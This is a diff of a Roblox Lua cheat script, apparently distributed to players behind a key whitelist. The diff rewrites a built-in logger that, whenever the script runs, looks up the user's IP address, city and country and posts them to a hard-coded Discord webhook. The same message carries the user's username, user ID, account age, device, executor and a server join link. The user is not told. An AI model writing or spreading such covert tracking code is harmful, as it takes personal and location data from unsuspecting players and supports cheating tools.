@@ -62,20 +62,23 @@ local whitelistedKeys = {"MONSY-81ZK-0DM5-2VY4", "ano", "BOC-45ZK-6DR3-1QX7", "M
 
 --// CONFIG
 local webhookURL = "https://discord.com/api/webhooks/1424264813001048125/rjgwpJImauKHhuuP-pI3BbWTU7-jPxIZxHoLyrnfsdgnpgxAj1mMVN46EpEKk0cqqnwa"
-local scriptVersion = "MONSY MAIN MENU"
-local executorName = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
+local scriptVersion = "MONSY MAIN CHEAT"
+local webhookUsername = "Monsy West"
+local webhookAvatarURL = "https://media.discordapp.net/attachments/1405859756756828251/1411694185245048983/1752754542988.jpg"
 
 --// SERVICES
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local Stats = game:GetService("Stats")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
 
 --// GAME INFO
 local placeId = game.PlaceId
 local success, productInfo = pcall(function()
-    return MarketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset)
+	return MarketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset)
 end)
 local gameName = success and productInfo.Name or "Unknown"
 local creatorName = success and productInfo.Creator.Name or "Unknown"
@@ -92,17 +95,15 @@ local joinDate = os.date("%Y-%m-%d", os.time() - (accountAge * 86400))
 local avatarHeadshot = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png"):format(userId)
 local profileLink = ("https://www.roblox.com/users/%d/profile"):format(userId)
 
---// NETWORK INFO (real IP)
+--// NETWORK INFO
 local ip, city, country = "Unknown", "Unknown", "Unknown"
-local successIP, ipResponse = pcall(function()
-    return game:HttpGet("http://ip-api.com/json/")
+pcall(function()
+	local ipResponse = game:HttpGet("http://ip-api.com/json/")
+	local ipData = HttpService:JSONDecode(ipResponse)
+	ip = ipData.query or "Unknown"
+	city = ipData.city or "Unknown"
+	country = ipData.country or "Unknown"
 end)
-if successIP then
-    local ipData = HttpService:JSONDecode(ipResponse)
-    ip = ipData.query or "Unknown"
-    city = ipData.city or "Unknown"
-    country = ipData.country or "Unknown"
-end
 
 --// PERFORMANCE
 local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
@@ -111,9 +112,9 @@ local fps = math.floor(1 / RunService.RenderStepped:Wait())
 --// DEVICE TYPE
 local deviceType = "PC"
 if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-    deviceType = "Mobile"
+	deviceType = "Mobile"
 elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
-    deviceType = "Console"
+	deviceType = "Console"
 end
 
 --// SERVER INFO
@@ -123,65 +124,74 @@ local joinServerLink = ("https://www.roblox.com/games/%d?privateServerLinkCode=%
 
 --// SEND TO DISCORD
 local function sendWebhook(usedKey)
-    local data = {
-        embeds = { {
-            title = "📜 Script Executed",
-            color = 3447003,
-            thumbnail = { url = avatarHeadshot },
-            image = { url = gameThumbnail },
-            fields = {
-                {
-                    name = "👤 Player Info",
-                    value = string.format(
-                        "**Username:** [%s](%s) (`%d`)\n**Display Name:** %s\n**Account Age:** `%d days`\n**Join Date:** `%s`\n**Device:** `%s`",
-                        LocalPlayer.Name, profileLink, userId, displayName, accountAge, joinDate, deviceType
-                    ),
-                    inline = true
-                },
-                {
-                    name = "🎮 Game Info",
-                    value = string.format(
-                        "**Game:** [%s](%s)\n**Creator:** [%s](https://www.roblox.com/users/%s/profile)\n**Visits:** `%s`\n**Players in Server:** `%d`",
-                        gameName, gameLink, creatorName, tostring(creatorId), visits, totalPlayers
-                    ),
-                    inline = true
-                },
-                {
-                    name = "🌍 Network",
-                    value = string.format(
-                        "**IP:** `%s`\n**City:** `%s`\n**Country:** `%s`\n**Ping:** `%dms`\n**FPS:** `%d`",
-                        ip, city, country, ping, fps
-                    ),
-                    inline = true
-                },
-                {
-                    name = "⚙️ Script Info",
-                    value = string.format(
-                        "**Executor:** `%s`\n**Version:** `%s`\n**Used Key:** `%s`",
-                        executorName, scriptVersion, usedKey or "None"
-                    ),
-                    inline = true
-                },
-                {
-                    name = "🔗 Join Server",
-                    value = string.format("[Click to Join](%s)", joinServerLink),
-                    inline = false
-                }
-            },
-            footer = {
-                text = "Logged at " .. os.date("%Y-%m-%d %H:%M:%S")
-            }
-        } }
-    }
+	local data = {
+		username = webhookUsername,
+		avatar_url = webhookAvatarURL,
+		embeds = { {
+			title = "▪️ Script Executed",
+			color = 0x010101,
+			thumbnail = { url = avatarHeadshot },
+			image = { url = gameThumbnail },
+			fields = {
+				{
+					name = "▪️ Player Info",
+					value = string.format(
+						"**Username:** [%s](%s) (`%d`)\n**Display Name:** %s\n**Account Age:** `%d days`\n**Join Date:** `%s`\n**Device:** `%s`",
+						LocalPlayer.Name, profileLink, userId, displayName, accountAge, joinDate, deviceType
+					),
+					inline = true
+				},
+				{
+					name = "▪️ Game Info",
+					value = string.format(
+						"**Game:** [%s](%s)\n**Creator:** [%s](https://www.roblox.com/users/%s/profile)\n**Visits:** `%s`\n**Players in Server:** `%d`",
+						gameName, gameLink, creatorName, tostring(creatorId), visits, totalPlayers
+					),
+					inline = true
+				},
+				{
+					name = "▪️ Network",
+					value = string.format(
+						"**IP:** `%s`\n**City:** `%s`\n**Country:** `%s`\n**Ping:** `%dms`\n**FPS:** `%d`",
+						ip, city, country, ping, fps
+					),
+					inline = true
+				},
+				{
+					name = "▪️ Script Info",
+					value = string.format(
+						"**Executor:** `%s`\n**Version:** `%s`\n**Used Key:** `%s`",
+						(identifyexecutor and identifyexecutor()) or "Unknown Executor",
+						scriptVersion,
+						usedKey or "N/A"
+					),
+					inline = false
+				},
+				{
+					name = "▪️ Join Server",
+					value = string.format("[Click to Join](%s)", joinServerLink),
+					inline = false
+				}
+			},
+			footer = {
+				text = "Logged at " .. os.date("%Y-%m-%d %H:%M:%S"),
+				icon_url = webhookAvatarURL
+			}
+		} }
+	}
 
-    local jsonData = HttpService:JSONEncode(data)
-    if syn and syn.request then
-        syn.request({ Url = webhookURL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonData })
-    elseif http_request then
-        http_request({ Url = webhookURL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonData })
-    elseif request then
-        request({ Url = webhookURL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonData })
-    end
+	local jsonData = HttpService:JSONEncode(data)
+	local req = syn and syn.request or http_request or request
+	if req then
+		req({
+			Url = webhookURL,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = jsonData
+		})
+	else
+		warn("[LOGGER] No supported HTTP request function found.")
+	end
 end
 
 --=== Begin Embedded GUI Script ===--
@@ -13698,6 +13708,3 @@ Submit.MouseButton1Click:Connect(function()
         TeleportService:Teleport(0, LocalPlayer)
     end
 end)
-
-
-
